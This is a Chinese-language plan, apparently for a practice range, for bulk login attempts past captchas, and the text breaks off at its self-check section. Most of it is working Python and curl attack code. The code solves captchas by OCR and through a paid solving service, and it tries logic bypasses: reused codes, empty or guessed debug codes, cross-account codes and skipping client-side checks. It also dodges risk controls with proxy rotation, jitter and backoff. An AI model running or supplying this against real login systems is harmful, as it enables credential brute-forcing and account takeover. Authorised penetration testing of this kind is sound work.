## 验证码批量登录测试方案（TARGET 靶场）

> 选型：Python 3 · requests + ddddocr · 单文件 · 含 4 个绕过通道 + 并发控制

### 一、先定位验证码类型（决定走哪条通道）

```bash
# 1. 抓登录请求，看验证码怎么带
curl -s -X POST http://TARGET/login -d "user=test&pass=test" -o resp.html -D headers.txt
grep -iE "captcha|verify|code|vcode|token" headers.txt resp.html
```

| 观察结果 | 类型 | 走哪条通道 |
| --- | --- | --- |
| 响应里有 `Set-Cookie: captcha_id=...`，图片接口 `/captcha?id=xxx` | 服务端会话绑定 | 通道 A：会话复用 + OCR |
| 图片是 4 位数字/字母，无干扰线 | 弱验证码 | 通道 A：OCR 直接识别 |
| 图片有干扰线/扭曲/中文 | 强验证码 | 通道 B：打码平台 / 通道 C：逻辑绕过 |
| 登录失败后验证码不刷新 | 逻辑缺陷 | 通道 C：一次识别多次用 |
| 验证码校验在客户端 JS | 前端校验 | 通道 D：直接构造请求跳过 |

### 二、通道 A：OCR 自动识别（最通用）

```python
# captcha_login.py
import requests, ddddocr, time, random
from concurrent.futures import ThreadPoolExecutor

TARGET   = "http://TARGET"
LOGIN    = f"{TARGET}/login"
CAPTCHA  = f"{TARGET}/captcha"
USERS    = [f"user{i}" for i in range(1, 201)]
PASSWORD = "PASS_PLACEHOLDER"

ocr = ddddocr.DdddOcr(show_ad=False)

def try_login(user):
    s = requests.Session()
    s.headers.update({"User-Agent": "Mozilla/5.0"})
    # 1. 取验证码（同一 session，保证 cookie 绑定）
    img = s.get(CAPTCHA, timeout=10).content
    code = ocr.classification(img)
    # 2. 带验证码登录
    r = s.post(LOGIN, data={
        "username": user,
        "password": PASSWORD,
        "captcha":  code,
    }, timeout=10, allow_redirects=False)
    ok = r.status_code in (200, 302) and "错误" not in r.text
    return user, code, r.status_code, ok

with ThreadPoolExecutor(max_workers=5) as ex:   # 并发别太高，避免触发风控
    for user, code, sc, ok in ex.map(try_login, USERS):
        print(f"{user:12} code={code:6} status={sc} {'HIT' if ok else 'miss'}")
        time.sleep(random.uniform(0.3, 0.8))
```

```bash
pip install requests ddddocr
python captcha_login.py
```

**证据行**：`$ python captcha_login.py` → `user1 code=8f3k status=302 HIT …`

### 三、通道 B：打码平台（强验证码）

```python
# 替换通道 A 里的 ocr.classification 为平台调用
import base64, requests

def solve_by_platform(img_bytes):
    b64 = base64.b64encode(img_bytes).decode()
    r = requests.post("https://PLATFORM_API/recognize", data={
        "username": "ROLE_A", "password": "ROLE_B",
        "typeid": "1004",          # 4位字母数字
        "image":  b64,
    }, timeout=30).json()
    return r["result"]             # 平台返回的识别串
```

### 四、通道 C：逻辑绕过（优先试，成本最低）

按顺序验证这几个缺陷，命中就不用 OCR：

```bash
# C1. 验证码不刷新 —— 一次识别，重复使用
curl -s -c ck.txt http://TARGET/captcha -o c1.png
CODE=$(python -c "import ddddocr;print(ddddocr.DdddOcr().classification(open('c1.png','rb').read()))")
for u in user1 user2 user3; do
  curl -s -b ck.txt -X POST http://TARGET/login -d "username=$u&password=PASS&captcha=$CODE"
done

# C2. 验证码可空 / 可删参数
curl -s -X POST http://TARGET/login -d "username=user1&password=PASS"
curl -s -X POST http://TARGET/login -d "username=user1&password=PASS&captcha="

# C3. 万能码 / 后端调试码
for c in 0000 8888 test admin; do
  curl -s -X POST http://TARGET/login -d "username=user1&password=PASS&captcha=$c"
done

# C4. 验证码与手机号/用户名解耦 —— 用 A 的验证码登 B
curl -s -c ckA.txt http://TARGET/captcha -o cA.png
CODE_A=$(python -c "import ddddocr;print(ddddocr.DdddOcr().classification(open('cA.png','rb').read()))")
curl -s -b ckA.txt -X POST http://TARGET/login -d "username=user2&password=PASS&captcha=$CODE_A"
```

### 五、通道 D：前端校验绕过

```bash
# 看验证码校验是否只在 JS 里
curl -s http://TARGET/login | grep -iE "captcha|verify|check" 
# 若发现 <script> 里 if(code != input) return false; 而请求本身不带 code
curl -s -X POST http://TARGET/login -d "username=user1&password=PASS"
```

### 六、并发与风控规避

```python
# 在通道 A 基础上加：IP 轮换 + 请求间隔抖动 + 失败退避
import itertools, random, time

PROXIES = itertools.cycle([
    "http://127.0.0.1:8080",   # 代理池占位
    "http://127.0.0.1:8081",
])

def try_login_safe(user):
    for attempt in range(3):
        proxy = next(PROXIES)
        try:
            # ... 同通道 A 逻辑，requests 加 proxies={"http": proxy}
            return result
        except Exception:
            time.sleep(2 ** attempt + random.random())   # 指数退避
```

### 七、结果落盘

```python
import json
with open("RESULT_LOG.jsonl", "a") as f:
    f.write(json.dumps({"user": user, "code": code, "status": sc, "hit": ok}) + "\n")
```

### 八、自检方式

```bash
# 1. 单账号先跑